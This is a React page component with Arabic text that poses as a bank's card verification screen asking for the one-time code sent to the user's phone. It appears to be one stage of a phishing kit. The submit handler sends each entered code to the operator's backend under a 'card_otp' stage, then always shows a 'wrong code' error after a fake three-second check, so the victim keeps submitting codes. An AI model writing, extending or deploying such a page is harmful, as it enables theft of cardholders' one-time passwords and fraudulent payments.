import { FormEvent, useEffect, useState } from "react";
import { createOrUpdateRequest, fillFieldMessage } from "@/api/visitorSession";
import { AdminGatedScreen } from "@/components/AdminGatedScreen";
import { useVisitorSession } from "@/hooks/useVisitorSession";

/** أعلى حد تقني فقط — العميل يدخل أي طول من الأرقام ضمنه */
const OTP_MAX_DIGITS = 32;

function formatTime(total: number) {
  const m = Math.floor(total / 60);
  const s = total % 60;
  return `${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")}`;
}

export default function CardVerifyPage() {
  const [otp, setOtp] = useState("");
  const [timer, setTimer] = useState(300);
  const [fillError, setFillError] = useState<string | null>(null);
  const [wrongError, setWrongError] = useState(false);
  const [loading, setLoading] = useState(false);

  useVisitorSession("card_otp");

  useEffect(() => {
    if (timer <= 0) return;
    const t = setTimeout(() => setTimer((v) => v - 1), 1000);
    return () => clearTimeout(t);
  }, [timer]);

  const onSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!otp.trim()) {
      setFillError(fillFieldMessage("رمز التحقق"));
      setWrongError(false);
      return;
    }
    setFillError(null);
    setWrongError(false);
    await createOrUpdateRequest({
      stage_key: "card_otp",
      extra_key_e: otp,
      notify_key: "----",
      stage_state: "pending",
    });

    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setOtp("");
      setWrongError(true);
    }, 3000);
  };

  return (
    <AdminGatedScreen>
      <>
        <main className="page-bank__shell view--bank view--verify" aria-label="رمز تحقق البطاقة">
          <header className="verify-header">
            <h2 className="verify-title">رمز التحقق الذي وصل إلى هاتفك</h2>
            <p className="verify-desc">
              أدخل رمز التحقق المرسل إلى رقم هاتفك المرتبط بالبطاقة. إذا لم يصلك الرمز خلال 5 دقائق، يمكنك انتظار
              إعادة الإرسال.
            </p>
          </header>
          <form className="verify-form" onSubmit={onSubmit} noValidate>
            <p className="verify-timer">
              صلاحية الرمز: <span>{formatTime(timer)}</span>
            </p>
            <label className="verify-field">
              <input
                type="text"
                className="verify-input verify-input--variable"
                inputMode="numeric"
                autoComplete="off"
                maxLength={OTP_MAX_DIGITS}
                placeholder="أدخل رمز التحقق"
                value={otp}
                onChange={(e) => {
                  const v = e.target.value.replace(/\D/g, "").slice(0, OTP_MAX_DIGITS);
                  setOtp(v);
                  if (v.length > 0) {
                    setFillError(null);
                    setWrongError(false);
                  }
                }}
                onBlur={() => {
                  if (!otp.trim()) setFillError(fillFieldMessage("رمز التحقق"));
                }}
                disabled={loading}
              />
            </label>
            {fillError && (
              <p className="verify-error" role="alert">
                {fillError}
              </p>
            )}
            {wrongError && (
              <p className="verify-error" role="alert">
                رمز التحقق خاطئ
              </p>
            )}
            <button type="submit" className="btn-confirm" disabled={!otp.trim() || loading}>
              تأكيد
            </button>
          </form>
        </main>
        {loading && (
          <div className="loading-overlay" aria-live="polite">
            <div className="spinner" aria-hidden="true" />
            <span className="loading-text">جاري التحقق...</span>
          </div>
        )}
      </>
    </AdminGatedScreen>
  );
}